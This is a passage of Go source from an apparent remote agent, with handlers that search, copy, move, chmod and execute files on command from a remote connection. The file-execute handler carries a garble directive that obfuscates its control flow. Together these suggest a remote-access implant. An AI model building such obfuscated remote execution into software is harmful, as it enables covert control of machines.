					results = append(results, wire.FileSearchMatch{
						Path:  path,
						Line:  lineNum,
						Match: line,
					})
					matchCount++
					if matchCount >= maxResults {
						break
					}
				}
				lineNum++
			}
		}

		return nil
	})

	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.FileSearchResult{
		Type:      "file_search_result",
		CommandID: cmdID,
		SearchID:  searchID,
		Results:   results,
		Complete:  true,
		Error:     errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileCopy(ctx context.Context, env *agentRuntime.Env, cmdID string, source string, dest string) error {
	log.Printf("file_copy: %s -> %s", source, dest)

	info, err := os.Stat(source)
	if err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	if info.IsDir() {
		err = copyDir(source, dest)
	} else {
		err = copyFile(source, dest)
	}

	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileMove(ctx context.Context, env *agentRuntime.Env, cmdID string, source string, dest string) error {
	log.Printf("file_move: %s -> %s", source, dest)

	destDir := filepath.Dir(dest)
	if err := os.MkdirAll(destDir, 0755); err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	err := os.Rename(source, dest)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	sourceInfo, err := os.Stat(src)
	if err != nil {
		return err
	}
	return os.Chmod(dst, sourceInfo.Mode())
}

func copyDir(src, dst string) error {
	sourceInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(dst, sourceInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := copyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}

	return nil
}

func HandleFileChmod(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, mode string) error {
	log.Printf("file_chmod: %s mode=%s", path, mode)

	err := ChangeFilePermissions(path, mode)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileExecute(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	log.Printf("file_execute: %s", path)

	err := ExecuteFile(path)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
		log.Printf("file_execute error: %v", err)
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}
